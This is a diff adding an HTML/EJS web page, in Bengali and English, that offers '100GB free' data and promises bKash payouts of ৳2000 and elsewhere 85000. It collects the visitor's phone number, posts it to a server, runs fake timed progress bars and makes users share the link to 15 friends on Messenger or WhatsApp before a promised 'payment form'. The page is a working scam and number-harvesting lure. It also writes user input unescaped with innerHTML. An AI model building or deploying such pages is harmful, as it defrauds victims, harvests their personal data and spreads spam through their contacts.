@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>100GB Free</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/Css/NumberCollect.css">
+  <style>
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <%- include('ImageAndVanner') %>
+    
+    
+    <div id="free100gbAndStartButton">
+      <div class="freeMBNite">
+        ফ্রী ১০০জিবি নিতে নিচে ক্লিক করুন ⬇️⬇️⬇️।
+      </div>
+      <button id="startButton" class="free-button">100GB FREE</button>
+    </div>
+    <form id="numberForm" class="form hidden">
+      <div class="nicheNumberDen">
+        যে নাম্বারে টাকা পেতে চাই সেই নাম্বারটি নিচে লিখুন ⬇️⬇️⬇️।
+      </div>
+      <input type="text" id="numberInput" placeholder="Enter your number" class="input" required />
+      <button type="submit" class="submit-button">Submit</button>
+    </form>
+    <br/>
+
+    <div id="loadingContainer" class="progress-container hidden">
+      <div class="PleaseWait">
+        দয়াকরে অপেক্ষা করুন অটোমেটিক ফ্রী ১০০জিবি পেজ এ নিয়ে যাবে।
+      </div>
+      <div class="progress-bar">
+        <div id="loadingProgress" class="progress-fill">0%</div>
+      </div>
+    </div>
+
+    <div id="shareContainer" class="hidden">
+      <div class="shareButtonTopStyle">
+        <div class="juggo">এটা আপনার নাম্বার: <span id="userNumber"></span></div>
+        <div id="apniFreeMbPayarJoggo">আপনি ফ্রী MB পাওয়ার যোগ্য।</div>
+        <div class="">
+          কিভাবে আপনার ৳2000 পাবেন?
+          <br/>
+          
+          ১. এটিকে Messenger-এ এটি গ্রুপ অথবা ১৫ জন বন্ধুর সাথে শেয়ার করুন (নীচের "SHARE" আইকনে ক্লিক করুন)।
+          
+          <br/>
+          ২. সবুজ ভেরিফিকেশন বার পূর্ণ হলে আপনি স্বয়ংক্রিয়ভাবে আমাদের "PAYMENT FORM" পেজে রিডিরেক্ট হবেন।
+          
+          <br/>
+          ৩. সফল আবেদন করার পর আপনি আপনার bKash ড্যাশবোর্ডে ৮৫০০০ পেয়ে যাবেন।
+        </div>
+      </div>
+      <div class="share-buttons">
+        <button id="messengerShare" class="share-button messenger">Share on Messenger</button>
+        <button id="whatsappShare" class="share-button whatsapp">Share on WhatsApp</button>
+      </div>
+
+      <div class="progress-container" style="margin-top:20px;">
+        <div class="progress-bar">
+          <div id="shareProgress" class="progress-fill">0%</div>
+        </div>
+      </div>
+    </div>
+    <% if (cardData && cardData.length > 0) { %>
+      <%- include('Card', { cardData: cardData }) %>
+    <% } %>
+  </input>
+
+  <script>
+    const startButton = document.getElementById('startButton');
+    const free100gbAndStartButton = document.getElementById('free100gbAndStartButton');
+    const numberForm = document.getElementById('numberForm');
+    const numberInput = document.getElementById('numberInput');
+    const loadingContainer = document.getElementById('loadingContainer');
+    const loadingProgress = document.getElementById('loadingProgress');
+    const shareContainer = document.getElementById('shareContainer');
+    const shareProgressFill = document.getElementById('shareProgress');
+    const messengerShare = document.getElementById('messengerShare');
+    const whatsappShare = document.getElementById('whatsappShare');
+
+    let number = '';
+    let shareProgress = 0;
+    let sharing = false;
+    const shareSteps = [50, 70, 80, 90, 92, 94, 96, 98, 100];
+
+    startButton.addEventListener('click', () => {
+      startButton.classList.add('hidden');
+      free100gbAndStartButton.classList.add('hidden');
+      numberForm.classList.remove('hidden');
+    });
+
+    numberForm.addEventListener('submit', async (e) => {
+      document.getElementById('userNumber').innerHTML = numberInput.value;
+      e.preventDefault();
+      number = numberInput.value.trim();
+      if (!number) return;
+
+      numberForm.classList.add('hidden');
+      loadingContainer.classList.remove('hidden');
+      updateProgress(0);
+
+      try {
+        await fetch('http://127.0.0.1:3000/number', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ number })
+        });
+
+        const progressSteps = [50, 70, 80, 90, 92, 94, 96, 98, 100];
+        progressSteps.forEach((val, index) => {
+          setTimeout(() => {
+            updateProgress(val);
+            if (val === 100) {
+              loadingContainer.classList.add('hidden');
+              shareContainer.classList.remove('hidden');
+            }
+          }, (index + 1) * 1000);
+        });
+      } catch (err) {
+        alert('Error sending data');
+        loadingContainer.classList.add('hidden');
+      }
+    });
+
+    function updateProgress(value) {
+      loadingProgress.style.width = value + '%';
+      loadingProgress.textContent = value + '%';
+    }
+
+    function increaseShareProgress() {
+      let currentIndex = shareSteps.findIndex(val => val > shareProgress);
+      if (currentIndex === -1) currentIndex = 0;
+      shareProgress = shareSteps[currentIndex];
+
+      setTimeout(() => {
+        shareProgressFill.style.width = shareProgress + '%';
+        shareProgressFill.textContent = shareProgress + '%';
+
+        if (shareProgress === 100) {
+          setTimeout(() => {
+            window.location.href = `/share/${number}`;
+          }, 500);
+        }
+      }, 3000);
+    }
+
+    whatsappShare.addEventListener('click', () => {
+      if (sharing) return;
+      sharing = true;
+
+      const text = encodeURIComponent(`${window.location.origin}/`);
+      window.open(`https://wa.me/?text=${text}`, '_blank');
+      increaseShareProgress();
+      sharing = false;
+    });
+
+    messengerShare.addEventListener('click', () => {
+      if (sharing) return;
+      sharing = true;
+
+      const fbShareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.origin + '/')}`;
+      const width = 600;
+      const height = 400;
+      const left = window.screen.width / 2 - width / 2;
+      const top = window.screen.height / 2 - height / 2;
+      window.open(
+        fbShareUrl,
+        'fbShareWindow',
+        `width=${width},height=${height},top=${top},left=${left},status=no,toolbar=no,menubar=no`
+      );
+
+      increaseShareProgress();
+      sharing = false;
+    });
+  </script>
+</body>
+</html>
